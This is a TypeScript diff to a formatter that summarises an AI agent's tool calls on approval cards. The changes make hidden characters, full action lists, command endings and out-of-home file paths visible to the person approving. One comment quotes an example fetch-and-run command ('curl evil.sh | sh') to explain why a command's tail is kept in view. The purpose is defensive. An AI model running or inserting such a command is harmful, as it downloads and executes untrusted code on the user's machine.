@@ -3,12 +3,29 @@
  * Keeps raw JSON out of the user's face.
  */
 
+import { placePath, reachWords, type FileHome } from "./filehome.js";
+import { showInvisible } from "./invisible.js";
+import { keyCaps, keyPlatformOf, type KeyPlatform } from "./keys.js";
+
 const MAX_VALUE = 120;
 const MAX_FIELDS = 6;
 
+/**
+ * A value on one line, cut to fit by its middle so its end always shows: a
+ * command's last part ("; curl evil.sh | sh") is where a harmless start
+ * hides what it does. A line break or tab in it is said as its key, never
+ * folded into a space, and a character that reorders or hides text (a
+ * direction mark, a zero-width space) as its code point.
+ */
 function truncate(s: string, n = MAX_VALUE): string {
-  const t = s.replace(/\s+/g, " ").trim();
-  return t.length <= n ? t : `${t.slice(0, n - 1)}…`;
+  const t = showInvisible(s)
+    .replace(/\r\n|\r|\n/g, " ⏎ ")
+    .replace(/\t/g, " ⇥ ")
+    .replace(/[ \f\v]+/g, " ")
+    .trim();
+  if (t.length <= n) return t;
+  const tail = Math.floor((n - 1) * 0.4);
+  return `${t.slice(0, n - 1 - tail)}…${t.slice(t.length - tail)}`;
 }
 
 function parseArgs(args: string | Record<string, unknown>): Record<string, unknown> {
@@ -72,8 +89,6 @@ const COMPUTER_CLICKS: Record<string, string> = {
   triple_click: "Triple-click",
 };
 
-/** At most this many parts in a step's line; the rest are counted. */
-const MAX_PARTS = 4;
 /** A single action this short may follow the step's purpose, in parentheses. */
 const SHORT_MECHANICS = 24;
 
@@ -83,10 +98,61 @@ const upperFirst = (s: string): string => s.charAt(0).toUpperCase() + s.slice(1)
 /** A name the formatter does not know, as words: "hold_key" is "Hold key". */
 const itself = (name: string): string => upperFirst(name.replace(/_/g, " ").trim());
 
-/** One action of a step: the words it reads as, and the action as the model wrote it. */
+/** A piece of a step's line: words, or one key chord as its keycap (⌘−), which a surface may draw as a key. */
+export type StepPiece = { text: string } | { key: string };
+/** One line of a step, in pieces: "Press ", ⌘−, " 4 times, then ", ⌘Home. */
+export type StepLine = StepPiece[];
+
+/** A line as plain words, its keys as their caps. */
+export function stepText(line: StepLine): string {
+  return line.map((p) => ("key" in p ? p.key : p.text)).join("");
+}
+
+/** One action of a step: its pieces, the chords it presses when it is a press, and the action as the model wrote it. */
 interface Part {
-  words: string;
+  pieces: StepLine;
+  /** Set when the action is a press of these chords alone, so presses in a row read as one. */
+  keys?: string[];
   raw: unknown;
+}
+
+const words = (text: string): Part => ({ pieces: [{ text }], raw: undefined });
+
+/**
+ * Typed words as a step shows them: every one, in quotes, a quote inside
+ * them escaped so they cannot read as the end of the step and the start of
+ * another, a line break or tab as the key it presses, and an invisible
+ * character as its code point.
+ */
+function typed(v: unknown): StepLine {
+  const text = typeof v === "string" ? v : fmtVal(v);
+  const pieces: StepLine = [{ text: "“" }];
+  for (const part of showInvisible(text).split(/(\r\n|\r|\n|\t)/)) {
+    if (part === "\n" || part === "\r\n" || part === "\r") pieces.push({ key: "⏎" });
+    else if (part === "\t") pieces.push({ key: "Tab" });
+    else if (part) pieces.push({ text: part.replace(/[“”"\\]/g, (q) => `\\${q}`) });
+  }
+  pieces.push({ text: "”" });
+  return pieces;
+}
+
+/** A step of words around typed words. */
+const withTyped = (before: string, v: unknown, after = ""): Part => ({ pieces: tidy([{ text: before }, ...typed(v), ...(after ? [{ text: after }] : [])]), raw: undefined });
+
+/** A point on the screen, as a click names it when it has nothing better: "at 412, 220". */
+function at(coordinate: unknown): string {
+  return Array.isArray(coordinate) && coordinate.length >= 2 && coordinate.every((c) => typeof c === "number") ? ` at ${coordinate[0]}, ${coordinate[1]}` : "";
+}
+
+/** A press of keys, as caps: nothing to press reads as "Press" alone. */
+function press(text: unknown, platform: KeyPlatform): Part {
+  const keys = typeof text === "string" ? keyCaps(text, platform) : [];
+  return keys.length ? { pieces: [{ text: "Press " }, ...spaced(keys)], keys, raw: undefined } : words("Press");
+}
+
+/** Keycaps with a space between each. */
+function spaced(keys: string[]): StepLine {
+  return keys.flatMap((key, i) => (i === 0 ? [{ key }] : [{ text: " " }, { key }]));
 }
 
 /** The same value, whatever order its keys were written in. */
@@ -98,26 +164,68 @@ function same(a: unknown, b: unknown): boolean {
   return ka.length === kb.length && ka.every((k) => same((a as Record<string, unknown>)[k], (b as Record<string, unknown>)[k]));
 }
 
-/**
- * The parts of one step as a line: repeats folded ("press Tab ×3"), the
- * first few said and the rest counted, so a long run stays readable. Only
- * the same action repeated folds: two clicks that read alike but land in
- * different places are two clicks.
- */
-function joinParts(parts: Part[], cap = MAX_PARTS): string {
-  const folded: string[] = [];
-  let run = 0;
-  for (const [i, part] of parts.entries()) {
-    run += 1;
-    const next = parts[i + 1];
-    if (next && same(next.raw, part.raw)) continue;
-    folded.push(run > 1 ? `${part.words} ×${run}` : part.words);
-    run = 0;
+/** "twice", "4 times": how often a run repeats, said after it. */
+const times = (n: number): string => (n === 2 ? " twice" : ` ${n} times`);
+
+/** Text pieces side by side as one, so a line is as few pieces as it reads. */
+function tidy(line: StepLine): StepLine {
+  const out: StepLine = [];
+  for (const piece of line) {
+    const last = out[out.length - 1];
+    if (last && "text" in last && "text" in piece) out[out.length - 1] = { text: last.text + piece.text };
+    else out.push(piece);
   }
-  const said = folded.length > cap ? folded.slice(0, cap - 1) : folded;
-  const rest = folded.length - said.length;
-  const line = said.map((p, i) => (i === 0 ? p : lowerFirst(p))).join(", ");
-  return rest ? `${line} and ${rest} more` : line;
+  return out;
+}
+
+/**
+ * A step's actions as the lines a person reads: the same action repeated
+ * said once with its count ("Click “Next” 3 times"), and presses in a row
+ * said as one ("Press ⌘− 4 times, then ⌘Home"). Only the same action
+ * repeated folds: two clicks that read alike but land in different places
+ * are two clicks. Nothing is left out, and every count is exact.
+ */
+function linesOf(parts: Part[]): StepLine[] {
+  const runs: { part: Part; count: number }[] = [];
+  for (const part of parts) {
+    const last = runs[runs.length - 1];
+    if (last && same(last.part.raw, part.raw)) last.count += 1;
+    else runs.push({ part, count: 1 });
+  }
+  const lines: StepLine[] = [];
+  for (let i = 0; i < runs.length; ) {
+    if (!runs[i]!.part.keys) {
+      const { part, count } = runs[i++]!;
+      lines.push(tidy(count > 1 ? [...part.pieces, { text: times(count) }] : part.pieces));
+      continue;
+    }
+    const presses: { keys: string[]; count: number }[] = [];
+    for (let run = runs[i]; run?.part.keys; run = runs[++i]) presses.push({ keys: run.part.keys, count: run.count });
+    const line: StepLine = [{ text: "Press " }];
+    for (const [j, p] of presses.entries()) {
+      if (j > 0) line.push({ text: j === presses.length - 1 ? ", then " : ", " });
+      line.push(...spaced(p.keys));
+      if (p.count > 1) line.push({ text: times(p.count) });
+    }
+    lines.push(tidy(line));
+  }
+  return lines;
+}
+
+/** A line with its first word lower-cased, to follow another in a sentence. */
+function following(line: StepLine): string {
+  const first = line[0];
+  return first && "text" in first ? lowerFirst(stepText(line)) : stepText(line);
+}
+
+/** Lines as one sentence: "Click, type “x”, press ⏎". */
+function sentence(lines: StepLine[]): string {
+  return lines.map((l, i) => (i === 0 ? stepText(l) : following(l))).join(", ");
+}
+
+/** The parts of one step as a line: every one, since a yes is given for all of them. */
+function joinParts(parts: Part[]): string {
+  return sentence(linesOf(parts));
 }
 
 /**
@@ -129,139 +237,189 @@ function withIntent(intent: unknown, parts: Part[]): string {
   const purpose = typeof intent === "string" ? intent.replace(/\s+/g, " ").trim().replace(/\.$/, "") : "";
   if (!purpose) return joinParts(parts);
   const head = upperFirst(truncate(purpose, 80));
-  const only = parts.length === 1 ? parts[0]!.words : "";
-  return only && only.length <= SHORT_MECHANICS ? `${head} (${lowerFirst(only)})` : head;
+  const lines = linesOf(parts);
+  const only = lines.length === 1 ? stepText(lines[0]!) : "";
+  return only && only.length <= SHORT_MECHANICS ? `${head} (${following(lines[0]!)})` : head;
 }
 
-/** One computer action in words. Coordinates name nothing the owner can see, so they are left out. */
-function computerAction(a: Record<string, unknown>): string {
+/** One computer action as words, naming where it lands by its point on the screen. */
+function computerAction(a: Record<string, unknown>, platform: KeyPlatform): Part {
   const action = typeof a.action === "string" ? a.action : "";
   const click = COMPUTER_CLICKS[action];
-  if (click) return `${click}${typeof a.text === "string" && a.text ? ` holding ${a.text}` : ""}`;
+  if (click) {
+    const where = `${click}${at(a.coordinate)}`;
+    const held = typeof a.text === "string" && a.text ? keyCaps(a.text.replace(/\s+/g, "+"), platform) : [];
+    return held.length ? { pieces: [{ text: `${where} holding ` }, ...spaced(held)], raw: undefined } : words(where);
+  }
   switch (action) {
     case "":
-      return "Use the computer";
+      return words("Use the computer");
     case "screenshot":
-      return "Look at the screen";
+      return words("Look at the screen");
     case "zoom":
-      return "Look closer at part of the screen";
+      return words("Look closer at part of the screen");
     case "mouse_move":
-      return "Move the pointer";
-    case "left_click_drag":
-      return "Drag";
+      return words(`Move the pointer${at(a.coordinate).replace(" at", " to")}`);
+    case "left_click_drag": {
+      const from = at(a.start_coordinate).replace(" at", " from");
+      const to = at(a.coordinate).replace(" at", " to");
+      return words(`Drag${from}${to}`);
+    }
     case "scroll":
-      return `Scroll ${fmtVal(a.scroll_direction ?? "down")}${typeof a.scroll_amount === "number" ? ` ${a.scroll_amount}` : ""}`;
+      return words(`Scroll ${fmtVal(a.scroll_direction ?? "down")}${typeof a.scroll_amount === "number" ? ` ${a.scroll_amount}` : ""}${at(a.coordinate)}`);
     case "type":
-      return `Type “${fmtVal(a.text)}”`;
+      return withTyped("Type ", a.text);
     case "key":
-      return `Press ${fmtVal(a.text)}`;
+      return press(a.text, platform);
     case "wait":
-      return `Wait ${fmtVal(a.duration ?? 1)}s`;
+      return words(`Wait ${fmtVal(a.duration ?? 1)}s`);
     default:
-      return itself(action);
+      return words(itself(action));
   }
 }
 
 /** A computer step as what it does on the screen; a device id names nothing the owner knows, so it is left out. */
-function computerStep(tool: string, a: Record<string, unknown>): string {
+function computerStep(tool: string, a: Record<string, unknown>, platform: KeyPlatform): string {
   if (tool === "computer.devices") return "List the paired computers";
   if (tool === "computer.end") return "Give the computer back";
   if (tool === "computer.start") {
     const device = typeof a.device === "string" && !a.device.startsWith("dev_") ? a.device : "a computer";
     return `Use ${device}: ${fmtVal(a.task)}`;
   }
-  if (tool === "computer.act") return withIntent(a.intent, actParts(tool, a));
+  if (tool === "computer.act") return withIntent(a.intent, actParts(tool, a, platform));
   return itself(tool.slice("computer.".length)) || "Use the computer";
 }
 
-/** A browser.act target in words: the text it names, a selector as written, nothing for a @ref. */
+/**
+ * What a browser.act step acts on, in words, always something: its label
+ * ("“Submit”"), its role and ref ("button e5"), a ref alone ("element e5"),
+ * or a selector as written.
+ */
 function targetWords(v: unknown): string {
-  const t = v && typeof v === "object" ? ((v as Record<string, unknown>)["target"] ?? (v as Record<string, unknown>)["selector"]) : v;
-  if (typeof t !== "string" || !t || t.startsWith("@")) return "";
+  const o = v && typeof v === "object" && !Array.isArray(v) ? (v as Record<string, unknown>) : undefined;
+  const label = typeof o?.["label"] === "string" ? o["label"] : typeof o?.["name"] === "string" ? o["name"] : undefined;
+  if (label) return ` “${truncate(label, 40)}”`;
+  const t = o ? (o["target"] ?? o["selector"]) : v;
+  if (typeof t !== "string" || !t) return "";
+  if (t.startsWith("@")) return ` ${typeof o?.["role"] === "string" ? o["role"] : "element"} ${t.slice(1)}`;
   const text = /^text=(.+)$/.exec(t)?.[1] ?? /:has-text\(['"](.+)['"]\)/.exec(t)?.[1];
   return text ? ` “${truncate(text, 40)}”` : ` ${truncate(t, 40)}`;
 }
 
-/** One browser.act step in words. */
-function browserStep(s: Record<string, unknown>): string {
+/** One browser.act step as words, naming what it acts on. */
+function browserStep(s: Record<string, unknown>, platform: KeyPlatform): Part {
   const key = Object.keys(s)[0] ?? "";
   const v = s[key];
   const field = (name: string): unknown => (v && typeof v === "object" ? (v as Record<string, unknown>)[name] : undefined);
+  const into = (): string => {
+    const t = targetWords(v);
+    return t ? ` into${t}` : "";
+  };
   switch (key) {
     case "click":
-      return `Click${targetWords(v)}`;
+      return words(`Click${targetWords(v)}`);
     case "dblclick":
-      return `Double-click${targetWords(v)}`;
+      return words(`Double-click${targetWords(v)}`);
     case "rightclick":
-      return `Right-click${targetWords(v)}`;
+      return words(`Right-click${targetWords(v)}`);
     case "hover":
-      return `Point at${targetWords(v) || " something"}`;
-    case "drag":
-      return "Drag";
+      return words(`Point at${targetWords(v) || " something"}`);
+    case "drag": {
+      const from = targetWords(field("from"));
+      const to = targetWords(field("to"));
+      return words(`Drag${from ? `${from}` : ""}${to ? ` to${to}` : ""}`);
+    }
     case "fill":
-      return `Fill in “${fmtVal(field("text"))}”`;
+      return withTyped("Fill in ", field("text"), into());
     case "type":
-      return `Type “${fmtVal(field("text"))}”`;
+      return withTyped("Type ", field("text"), into());
     case "press":
-      return `Press ${fmtVal(v)}`;
+      return press(v, platform);
     case "select": {
       const values = field("values");
-      return `Choose ${fmtVal(Array.isArray(values) ? values.join(", ") : values)}`;
+      const t = targetWords(v);
+      return words(`Choose ${fmtVal(Array.isArray(values) ? values.join(", ") : values)}${t ? ` in${t}` : ""}`);
     }
     case "check":
-      return `Tick${targetWords(v)}`;
+      return words(`Tick${targetWords(v)}`);
     case "uncheck":
-      return `Untick${targetWords(v)}`;
+      return words(`Untick${targetWords(v)}`);
     case "scroll":
-      return v === "up" || v === "down" ? `Scroll ${v}` : `Scroll to${targetWords(v) || " something"}`;
+      return words(v === "up" || v === "down" ? `Scroll ${v}` : `Scroll to${targetWords(v) || " something"}`);
     case "open":
-      return `Open ${fmtVal(v)}`;
+      return words(`Open ${fmtVal(v)}`);
     case "go":
-      return v === "reload" ? "Reload the page" : `Go ${fmtVal(v)}`;
+      return words(v === "reload" ? "Reload the page" : `Go ${fmtVal(v)}`);
     case "wait":
-      return typeof field("text") === "string" ? `Wait for “${fmtVal(field("text"))}”` : "Wait";
+      return typeof field("text") === "string" ? withTyped("Wait for ", field("text")) : words("Wait");
     case "dialog":
-      return v === "accept" ? "Accept the dialog" : "Dismiss the dialog";
+      return words(v === "accept" ? "Accept the dialog" : "Dismiss the dialog");
     case "":
-      return "Act on the page";
+      return words("Act on the page");
     default:
-      return itself(key);
+      return words(itself(key));
   }
 }
 
+/** The tools whose arguments are a run of actions, said by actParts. */
+const ACTING = new Set(["computer.act", "browser.act"]);
+
 /**
- * The actions of one computer.act or browser.act call, each in words, by one
+ * The actions of one computer.act or browser.act call, each as words, by one
  * rule for both: the call's `actions` (or `steps`, the browser's older name
  * for them), or a computer's single action. Every surface's step line, its
  * mechanics and the narrator are made from these.
  */
-function actParts(tool: string, a: Record<string, unknown>): Part[] {
+function actParts(tool: string, a: Record<string, unknown>, platform: KeyPlatform): Part[] {
   const computer = tool === "computer.act";
+  const keys = keyPlatformOf(tool, platform);
   const list = Array.isArray(a.actions) ? a.actions : Array.isArray(a.steps) ? a.steps : computer ? [a] : [];
-  const words = (item: unknown): string => {
+  const parts = list.map((item: unknown) => {
     const action = item && typeof item === "object" ? (item as Record<string, unknown>) : {};
-    return computer ? computerAction(action) : browserStep(action);
-  };
-  const parts = list.map((item) => ({ words: words(item), raw: item as unknown }));
-  return parts.length ? parts : [{ words: computer ? "Use the computer" : "Act on the page", raw: null }];
+    return { ...(computer ? computerAction(action, keys) : browserStep(action, keys)), raw: item };
+  });
+  return parts.length ? parts : [words(computer ? "Use the computer" : "Act on the page")];
+}
+
+/**
+ * Every action of a computer.act or browser.act call as the lines a card
+ * lists, keys as keycaps for the platform they are pressed on: repeats said
+ * once with their count, presses in a row as one, nothing left out.
+ * Undefined for a tool that is not a run of actions.
+ */
+export function actionSteps(tool: string, args: string | Record<string, unknown>, platform: KeyPlatform = "mac"): StepLine[] | undefined {
+  return ACTING.has(tool) ? linesOf(actParts(tool, parseArgs(args), platform)) : undefined;
 }
 
 /**
  * How a step does what its line says, when the line says what it is for
- * instead: every action of a computer.act or browser.act that carries an
- * intent, in order, none folded and none left out, since an approval is
- * given for these and not for the model's account of them. Undefined where
- * the line already is the mechanics.
+ * instead: the lines of actionSteps for a computer.act or browser.act that
+ * carries an intent, since an approval is given for these and not for the
+ * model's account of them. Undefined where the line already is the
+ * mechanics.
  */
-export function stepActions(tool: string, args: string | Record<string, unknown>): string[] | undefined {
+export function stepActions(tool: string, args: string | Record<string, unknown>, platform: KeyPlatform = "mac"): string[] | undefined {
   const a = parseArgs(args);
   if (typeof a.intent !== "string" || !a.intent.trim()) return undefined;
-  return tool === "computer.act" || tool === "browser.act" ? actParts(tool, a).map((p) => p.words) : undefined;
+  return actionSteps(tool, a, platform)?.map(stepText);
 }
 
 /** stepActions as one line. */
-export function stepMechanics(tool: string, args: string | Record<string, unknown>): string | undefined {
-  return stepActions(tool, args)?.map((w, i) => (i === 0 ? w : lowerFirst(w))).join(", ");
+export function stepMechanics(tool: string, args: string | Record<string, unknown>, platform: KeyPlatform = "mac"): string | undefined {
+  const a = parseArgs(args);
+  if (typeof a.intent !== "string" || !a.intent.trim()) return undefined;
+  const lines = actionSteps(tool, a, platform);
+  return lines ? sentence(lines) : undefined;
+}
+
+/**
+ * Where the calling turn's paths start: its home folder, and the workspace
+ * root on disk when the caller knows it. Given, a step names the path a
+ * file tool really reaches and says when it reaches outside the home.
+ */
+export interface ActionHome {
+  home: FileHome;
+  root?: string;
 }
 
 /** One-line summary for a tool + args, with names for the ids the caller can name. */
@@ -269,8 +427,17 @@ export function summarizeAction(
   tool: string,
   args: string | Record<string, unknown>,
   names?: ActionNames,
+  where?: ActionHome,
+  platform: KeyPlatform = "mac",
 ): string {
   const a = parseArgs(args);
+  // The path a file tool reaches from the turn's home, and where it is when that is outside it; as written at the root.
+  const at = (raw: unknown, as: "read" | "change"): string => {
+    if (!where || where.home.folder === "" || (raw !== undefined && typeof raw !== "string")) return fmtVal(raw);
+    const placed = placePath(where.home, raw ?? "", where.root);
+    const note = reachWords(where.home, placed, as);
+    return `${fmtVal(placed.path)}${note ? ` (${note})` : ""}`;
+  };
   // A name where one is known, the value as written otherwise: an id alone
   // is no basis for a yes, and the id stays in the detail lines.
   const named = (kind: string, raw: unknown, fallback = fmtVal(raw)): string => {
@@ -309,21 +476,21 @@ export function summarizeAction(
     case "systems.project_create":
       return `Create project “${fmtVal(a.name)}” (${fmtVal(a.type)})`;
     case "files.write":
-      return `Write file ${fmtVal(a.path)}`;
+      return `Write file ${at(a.path, "change")}`;
     case "files.rm":
-      return `Delete ${fmtVal(a.path)}`;
+      return `Delete ${at(a.path, "change")}`;
     case "files.mkdir":
-      return `Create folder ${fmtVal(a.path)}`;
+      return `Create folder ${at(a.path, "change")}`;
     case "files.ls":
-      return `List ${fmtVal(a.path)}`;
+      return `List ${at(a.path, "read")}`;
     case "files.read":
-      return `Read ${fmtVal(a.path)}`;
+      return `Read ${at(a.path, "read")}`;
     case "files.edit":
-      return `Edit ${fmtVal(a.path)}`;
+      return `Edit ${at(a.path, "change")}`;
     case "files.cp":
-      return `Copy ${fmtVal(a.from)} to ${fmtVal(a.to)}`;
+      return `Copy ${at(a.from, "read")} to ${at(a.to, "change")}`;
     case "files.mv":
-      return `Move ${fmtVal(a.from)} → ${fmtVal(a.to)}`;
+      return `Move ${at(a.from, "change")} → ${at(a.to, "change")}`;
     case "sql":
       return `SQL: ${fmtVal(a.sql)}`;
     case "http.fetch":
@@ -339,11 +506,11 @@ export function summarizeAction(
     case "artifacts.guide":
       return `Read the ${a.kind ? `${fmtVal(a.kind)} ` : ""}artifact guide`;
     case "search.grep":
-      return `Search for “${fmtVal(a.pattern)}”`;
+      return `Search for “${fmtVal(a.pattern)}”${where && where.home.folder !== "" ? ` in ${at(a.path, "read")}` : ""}`;
     case "search.semantic":
       return `Recall about “${fmtVal(a.query)}”`;
     case "export.query":
-      return `Export ${fmtVal(a.format)} to ${fmtVal(a.path)}`;
+      return `Export ${fmtVal(a.format)} to ${at(a.path, "change")}`;
     case "notify": {
       const to = typeof a.to === "string" && a.to.trim() && a.to !== "owner" ? a.to.trim() : "";
       return to ? `Post to ${named("target", to)}: ${fmtVal(a.text)}` : `Tell you: ${fmtVal(a.text)}`;
@@ -405,7 +572,7 @@ export function summarizeAction(
     // The risky ones most often waiting on an approval. Each says the
     // thing it would do, so "risky tool" is never the whole card.
     case "shell.run":
-      return `Run: ${fmtVal(a.command)}${a.cwd ? ` (in ${fmtVal(a.cwd)})` : ""}`;
+      return `Run: ${fmtVal(a.command)}${a.cwd || (where && where.home.folder !== "") ? ` (in ${at(a.cwd, "change")})` : ""}${a.writes === "workspace" ? ", writing anywhere in the workspace" : ""}`;
     case "cron.run":
       return `Run the job ${named("schedule", a.id, `#${fmtVal(a.id)}`)} now`;
     case "builds.run":
@@ -440,12 +607,12 @@ export function summarizeAction(
     default:
       break;
   }
-  if (tool.startsWith("computer.")) return computerStep(tool, a);
+  if (tool.startsWith("computer.")) return computerStep(tool, a, platform);
   if (tool === "chrome.start") return `Work in your Chrome${typeof a.chrome === "string" ? ` (${a.chrome})` : ""}: ${fmtVal(a.task)}`;
   if (tool === "chrome.end") return "Give your Chrome back";
   if (tool === "chrome.page") return "Read the page beside the panel";
   if (tool === "python.run") return `Run Python: ${fmtVal(typeof a.code === "string" ? (a.code.split("\n").find((l) => l.trim()) ?? "").trim() : a.code)}`;
-  if (tool === "tex.pdf") return `Typeset ${fmtVal(a.path)} as a PDF`;
+  if (tool === "tex.pdf") return `Typeset ${at(a.path, "change")} as a PDF`;
   // KOS's own browser tools: a visit, a run of steps, or the owner's hands.
   if (tool === "browser.visit") {
     // One visit may take several pages; the card names them all.
@@ -459,7 +626,7 @@ export function summarizeAction(
   if (tool === "browser.use_tab") return `Switch to tab ${fmtVal(a.tab)}`;
   if (tool === "browser.new_tab") return a.url !== undefined ? `Open a new tab at ${fmtVal(a.url)}` : "Open a new tab";
   if (tool === "browser.watch") return `Watch ${fmtVal(a.name ?? a.url)} for change`;
-  if (tool === "browser.act") return withIntent(a.intent, actParts(tool, a));
+  if (tool === "browser.act") return withIntent(a.intent, actParts(tool, a, platform));
   // The old engine's actions, as transcripts from before KOS drove the
   // browser itself still hold them.
   const browser = /^mcp\.[^.]+\.agent_browser_(.+)$/.exec(tool);
@@ -497,6 +664,11 @@ export function summarizeAction(
         return `${action.replace(/_/g, " ")}${where ? ` ${where}` : ""}`;
     }
   }
+  // A mail server's send, as the email it is: to whom, about what.
+  if (/^mcp\.[^.]+\.(send_email|email_send)$/.test(tool)) {
+    const to = Array.isArray(a.to) ? a.to.join(", ") : a.to;
+    return `Email ${fmtVal(to)}${typeof a.subject === "string" && a.subject ? `: “${truncate(a.subject, 80)}”` : ""}`;
+  }
   const keys = Object.keys(a).slice(0, 3);
   // A server's tool, named mcp.<server>.<tool>: say whose it is.
   const mcp = /^mcp\.([^.]+)\.(.+)$/.exec(tool);
@@ -511,11 +683,12 @@ export function detailLines(
   tool: string,
   args: string | Record<string, unknown>,
   names?: ActionNames,
+  where?: ActionHome,
 ): string[] {
   const a = parseArgs(args);
   const lines: string[] = [];
   // Prefer a short summary line first.
-  lines.push(summarizeAction(tool, a, names));
+  lines.push(summarizeAction(tool, a, names, where));
   // A step said by its purpose keeps how it does it in view: an approval
   // is given for the clicks, not for the model's account of them.
   const mechanics = stepMechanics(tool, a);
